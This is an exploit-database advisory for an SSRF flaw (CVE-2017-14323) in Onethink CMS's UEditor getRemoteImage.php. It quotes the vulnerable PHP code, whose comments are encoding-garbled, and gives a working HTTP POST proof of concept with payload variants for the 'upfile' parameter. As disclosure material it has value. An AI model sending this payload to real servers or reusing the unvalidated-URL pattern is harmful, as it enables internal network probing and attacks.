@@ -1,0 +1,127 @@
+id: 30136
+date: 04/07/2018
+title: Onethink CMS Server Side Request Forgery Vulnerability
+author: Jiawang Zhang
+cves: CVE-2017-14323
+
+# SSRFPS"Server Side Request ForgeryPS(c) in Onethink  All version (CVE-2017-14323)
+
+The Onethink is an open source CMS(Content Management System).This system is based on the Thinkphp3.2 development framework. 
+
+## Product Download: http://www.onethink.cn
+
+## Vulnerability TypePSoSSRFPS"Server Side Request ForgeryPS(c)
+
+## Attack Type : Remote
+
+## Vulnerability Description
+
+Onethink uses a Ueditor editor with a flawed version that causes the SSRF vulnerability to occur.
+
+The vulnerability codePS"/Public/static/ueditor/php/getRemoteImage.phpPS(c):
+
+    $uri = htmlspecialchars( $_POST[ 'upfile' ] );
+    $uri = str_replace( "&" , "&" , $uri );
+    getRemoteImage( $uri,$config );
+    //echo($uri);
+
+    /**
+     * OP3IxY=E!
+     * @param $uri
+     * @param $config
+     */
+    function getRemoteImage( $uri,$config)
+    {
+        //ooAOxY=E!E+-1/4aIThOAE
+        set_time_limit( 0 );
+        //ue_separate_ue  ueOAOU'<<uUEy3/4U*O,i*uoA
+        $imgUrls = explode( "ue_separate_ue" , $uri );
+        $tmpNames = array();
+        foreach ( $imgUrls as $imgUrl ) {
+            //http?aI*NeO$?
+            if(strpos($imgUrl,"http")!==0){
+                array_push( $tmpNames , "error" );
+                continue;
+            }
+            //echo($imgUrl);
+            //>>nE!CeCoI*
+            $heads = get_headers( $imgUrl );   //This is a blind ssrf 
+            //EAA'1/4i2a
+            if ( !( stristr( $heads[ 0 ] , "200" ) && stristr( $heads[ 0 ] , "OK" ) ) ) {
+                array_push( $tmpNames , "error" );
+                continue;
+            }
+
+            //,nE1/2NeO$?(A(c)O1AuNeO$?oIContent-TypeNeO$?)
+            $fileType = strtolower( strrchr( $imgUrl , '.' ) );
+            if ( !in_array( $fileType , $config[ 'allowFiles' ] ) || stristr( $heads[ 'Content-Type' ] , "image" ) ) {
+                array_push( $tmpNames , "error" );
+                continue;
+            }
+            //var_dump($tmpNames);
+
+            //'o?aEa3o>>o3aCo2C/>>nE!OP3II1/4AE!
+            ob_start();
+            $context = stream_context_create(
+                array (
+                    'http' => array (
+                        'follow_location' => false // don't follow redirects
+                    )
+                )
+            );
+            //CeE*+-PSphp.iniODuAfopen wrappersON3/41/4$?>>i
+            readfile( $imgUrl,false,$context);    //vulnerability is here,request any http(s) url
+            $img = ob_get_contents();
+            ob_end_clean();
+
+## Exploit
+
+Request Content:
+
+    POST http://target/Public/static/ueditor/php/getRemoteImage.php HTTP/1.1
+    Host: target
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 37
+    Connection: keep-alive
+    
+    upfile=https://www.google.com/?%23.jpg
+
+Response Content:
+    
+    HTTP/1.1 200 OK
+    Server: nginx
+    Content-Type: text/html; charset=utf-8
+    Content-Length: 110
+
+    {'url':'upload/43361505134158.jpg','tip':'OP3II1/4AE!xY=E!3E1|PS!','srcUrl':'http://www.baidu.com/?#.jpg'}
+
+modify the above upfile parameterPS!example:
+
+request http protocol: upfile=http://www.google.com
+
+request https protocol: upfile=https://www.google.com
+
+This vulnerability only use http!C/https protocol
+
+this vulnerability  trigger need allow\_url\_fopen option is enable in php.iniPS!allow\_url\_fopen option defualt is enable.
+## Versions
+
+Onethink all version
+
+## Impact
+
+SSRF(Server Side Request Forgery) in Onethink V1.0 and V1.1 version allow remote attackers to information detection,internal network server attack.
+
+## Credit
+
+This vulnerability was discovered by Qian Wu & Bo Wang & Jiawang Zhang &  National Computer Network Emergency Response Technical Team/Coordination Center of China (CNCERT/CC)
+
+## References
+
+CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14323
+
+#  0day.today [2023-03-23]  #
